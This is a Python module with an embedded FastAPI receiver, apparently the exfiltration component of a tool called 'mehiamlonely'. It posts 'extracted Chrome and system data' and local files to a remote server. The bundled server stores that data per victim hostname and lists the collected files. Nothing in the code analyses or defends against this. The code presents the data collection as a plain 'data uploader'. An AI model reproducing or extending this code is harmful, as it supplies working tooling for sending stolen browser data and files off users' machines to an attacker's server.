"""
FastAPI Server Uploader
Handles sending extracted data to FastAPI server
"""

import asyncio
import json
import httpx
from typing import Dict, List, Any, Optional
from pathlib import Path
import aiofiles


class DataUploader:
    """Handles uploading extracted data to FastAPI server"""
    
    def __init__(self, server_url: str, api_key: Optional[str] = None):
        self.server_url = server_url.rstrip('/')
        self.api_key = api_key
        self.timeout = 30.0
        
    async def upload_data(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Upload extracted data to server"""
        try:
            async with httpx.AsyncClient(timeout=self.timeout) as client:
                headers = {
                    "Content-Type": "application/json",
                    "User-Agent": "mehiamlonely-client/1.0"
                }
                
                if self.api_key:
                    headers["Authorization"] = f"Bearer {self.api_key}"
                
                # Upload main data
                response = await client.post(
                    f"{self.server_url}/api/extract",
                    json=data,
                    headers=headers
                )
                
                if response.status_code == 200:
                    return {
                        "success": True,
                        "message": "Data uploaded successfully",
                        "response": response.json()
                    }
                else:
                    return {
                        "success": False,
                        "message": f"Server error: {response.status_code}",
                        "response": response.text
                    }
                    
        except httpx.TimeoutException:
            return {
                "success": False,
                "message": "Request timeout - server may be unreachable"
            }
        except httpx.ConnectError:
            return {
                "success": False,
                "message": "Connection error - server may be down"
            }
        except Exception as e:
            return {
                "success": False,
                "message": f"Upload error: {str(e)}"
            }
    
    async def upload_file(self, file_path: str, file_data: bytes) -> Dict[str, Any]:
        """Upload individual file to server"""
        try:
            async with httpx.AsyncClient(timeout=self.timeout) as client:
                headers = {
                    "User-Agent": "mehiamlonely-client/1.0"
                }
                
                if self.api_key:
                    headers["Authorization"] = f"Bearer {self.api_key}"
                
                files = {
                    "file": (Path(file_path).name, file_data, "application/octet-stream")
                }
                
                data = {
                    "file_path": file_path,
                    "file_size": len(file_data)
                }
                
                response = await client.post(
                    f"{self.server_url}/api/upload-file",
                    files=files,
                    data=data,
                    headers=headers
                )
                
                if response.status_code == 200:
                    return {
                        "success": True,
                        "message": f"File {file_path} uploaded successfully",
                        "response": response.json()
                    }
                else:
                    return {
                        "success": False,
                        "message": f"File upload error: {response.status_code}",
                        "response": response.text
                    }
                    
        except Exception as e:
            return {
                "success": False,
                "message": f"File upload error: {str(e)}"
            }
    
    async def upload_files_batch(self, files_data: List[Dict[str, Any]], max_files: int = 10) -> List[Dict[str, Any]]:
        """Upload multiple files in batches"""
        results = []
        
        # Limit number of files to avoid overwhelming the server
        files_to_upload = files_data[:max_files]
        
        for file_info in files_to_upload:
            try:
                file_path = Path(file_info["path"])
                if file_path.exists() and file_path.is_file():
                    # Read file content
                    async with aiofiles.open(file_path, 'rb') as f:
                        file_data = await f.read()
                    
                    # Upload file
                    result = await self.upload_file(file_info["path"], file_data)
                    results.append({
                        "file": file_info["path"],
                        "result": result
                    })
                    
                    # Small delay to avoid overwhelming server
                    await asyncio.sleep(0.1)
                    
            except Exception as e:
                results.append({
                    "file": file_info["path"],
                    "result": {
                        "success": False,
                        "message": f"Error reading file: {str(e)}"
                    }
                })
        
        return results
    
    async def test_connection(self) -> Dict[str, Any]:
        """Test connection to server"""
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                headers = {
                    "User-Agent": "mehiamlonely-client/1.0"
                }
                
                if self.api_key:
                    headers["Authorization"] = f"Bearer {self.api_key}"
                
                response = await client.get(
                    f"{self.server_url}/api/health",
                    headers=headers
                )
                
                if response.status_code == 200:
                    return {
                        "success": True,
                        "message": "Server connection successful",
                        "server_info": response.json()
                    }
                else:
                    return {
                        "success": False,
                        "message": f"Server health check failed: {response.status_code}"
                    }
                    
        except Exception as e:
            return {
                "success": False,
                "message": f"Connection test failed: {str(e)}"
            }


async def upload_all_data(server_url: str, data: Dict[str, Any], api_key: Optional[str] = None, upload_files: bool = False) -> Dict[str, Any]:
    """Upload all extracted data to server"""
    uploader = DataUploader(server_url, api_key)
    
    # Test connection first
    connection_test = await uploader.test_connection()
    if not connection_test["success"]:
        return {
            "success": False,
            "message": f"Connection test failed: {connection_test['message']}",
            "connection_test": connection_test
        }
    
    # Upload main data
    upload_result = await uploader.upload_data(data)
    
    results = {
        "connection_test": connection_test,
        "data_upload": upload_result,
        "file_uploads": []
    }
    
    # Upload files if requested
    if upload_files and upload_result["success"]:
        files_data = data.get("files", [])
        if files_data:
            file_results = await uploader.upload_files_batch(files_data, max_files=5)
            results["file_uploads"] = file_results
    
    # Determine overall success
    results["success"] = upload_result["success"]
    results["message"] = upload_result["message"]
    
    return results


def create_sample_fastapi_server() -> str:
    """Create a sample FastAPI server code for testing"""
    server_code = '''
from fastapi import FastAPI, HTTPException, UploadFile, File, Form
from fastapi.middleware.cors import CORSMiddleware
import json
from typing import Dict, Any, Optional
import os
from datetime import datetime

app = FastAPI(title="mehiamlonely Data Receiver", version="1.0.0")

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory storage (use database in production)
extracted_data = {}
uploaded_files = {}

@app.get("/api/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "service": "mehiamlonely-receiver"
    }

@app.post("/api/extract")
async def receive_extracted_data(data: Dict[str, Any]):
    """Receive extracted Chrome and system data"""
    try:
        # Store the data
        client_id = data.get("system_info", {}).get("hostname", "unknown")
        extracted_data[client_id] = {
            "timestamp": datetime.now().isoformat(),
            "data": data
        }
        
        return {
            "success": True,
            "message": "Data received successfully",
            "client_id": client_id,
            "data_size": len(json.dumps(data))
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error processing data: {str(e)}")

@app.post("/api/upload-file")
async def upload_file(file: UploadFile = File(...), file_path: str = Form(...), file_size: int = Form(...)):
    """Receive uploaded files"""
    try:
        file_content = await file.read()
        
        # Store file info
        uploaded_files[file_path] = {
            "filename": file.filename,
            "size": len(file_content),
            "timestamp": datetime.now().isoformat(),
            "content": file_content  # In production, save to disk
        }
        
        return {
            "success": True,
            "message": f"File {file.filename} uploaded successfully",
            "file_size": len(file_content)
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error uploading file: {str(e)}")

@app.get("/api/data/{client_id}")
async def get_client_data(client_id: str):
    """Get stored data for a specific client"""
    if client_id not in extracted_data:
        raise HTTPException(status_code=404, detail="Client data not found")
    
    return extracted_data[client_id]

@app.get("/api/files")
async def list_uploaded_files():
    """List all uploaded files"""
    return {
        "files": list(uploaded_files.keys()),
        "count": len(uploaded_files)
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
'''
    
    return server_code